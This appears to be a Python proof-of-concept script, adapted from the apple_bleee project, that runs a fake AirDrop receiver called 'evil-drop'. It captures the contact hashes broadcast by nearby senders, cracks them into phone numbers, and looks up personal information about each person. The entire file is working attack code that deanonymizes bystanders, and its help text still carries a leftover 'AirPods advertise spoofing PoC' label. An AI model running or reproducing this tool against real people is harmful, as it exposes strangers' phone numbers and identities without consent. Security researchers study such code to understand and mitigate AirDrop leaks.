# Adapting script from https://github.com/hexway/apple_bleee
# Thanks to Dmitry Chastuhin @_chipik and https://hexway.io 
# Author: @lucferbux
from utils.ble_apple.wireless_interface import BadInterfaceException, ModeMonitorException, OwlException, check_wifi_config
import time
import hashlib
from threading import Thread, Timer
import argparse
import sys
from utils.opendrop.base import AirDropBase
from utils.hash_validator import check_hash
from business_card.request_data import RequestData


class AirdropLeak():

    def __init__(self, args=None, name='evil-drop', iface='wlan0', phone='34666666666', mail='example@gmail.com', callback=None):
        if args:
            self.name = args.name
            self.iface = args.iface
            self.phone = args.phone
            self.mail = args.mail
        else:
            self.name = name
            self.iface = iface
            self.phone = phone
            self.mail = mail
        self.results = {}
        self.scanning = False


    def run(self):
        self.scanning = True
        try:
            print("Configuring owl interface...")
            check_wifi_config(self.iface)
            time.sleep(5) # time to wake up owl process
        except ModeMonitorException:
            print("Error, mode monitor not suported in the given interface, press ctr+c to continue")
            return
        except BadInterfaceException:
            print("Error, inteface not found, press ctr+c to continue")
            return
        except OwlException:
            print("Error, there was a problem setting up owl, press ctr+c to continue, if not insalled --> https://github.com/seemoo-lab/owl.git")
            return
        except Exception as e:
            print(f"Error, something went wrong configuring the interface, press ctr+c to continue --> {e}")
            return
        
        try:
            self.start_listetninig()
        except:
            print("")
            print("Bye")
            sys.exit()

    def get_people(self):
        return self.results

    def start_listetninig(self):
        print("[*] Looking for AirDrop senders...")
        AirDropBase("receive", name=self.name, callback=self.process_devices, email=self.mail, phone=self.phone)

    def get_hash(self, data):
        return hashlib.sha256(data.encode('utf-8')).hexdigest()


    def process_devices(self, device):
        hash = device.get("hash", None)
        hash = hash.replace("\\x04)", "")
        hash = hash.replace("\\x00)", "")
        if(hash not in self.results.keys()):
            self.results.update({hash : {}}) 
            print("found one...")
            try:                       
                phone = check_hash(hash)
            except Exception as e:
                print(e)
                phone = "None"
            if(phone != "None"):
                print(f"Someone with phone number {phone} and hash {hash} has tried to use AirDrop")
                info_request = RequestData(phone=phone)
                info = info_request.get_info()
                self.results[hash] = info
                print(self.results)
            else:
                print(f"Someone with hash {hash} has tried to use AirDrop")


def create_parser():
    help_desc = '''
    AirPods advertise spoofing PoC
    ---chipik
    '''
    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-n', '--name', default="evil-drop", help='Name of the interface')
    parser.add_argument('-i', '--iface', default='wlan0', help='Wireless inteface')
    parser.add_argument('-p', '--phone', default='34666666666', help='phone')
    parser.add_argument('-m', '--mail', default='example@gmail.com', help='mail')
    return parser.parse_args()

if __name__ == "__main__":
    args = create_parser()
    aidrop_leak = AirdropLeak(args)
    aidrop_leak.run()
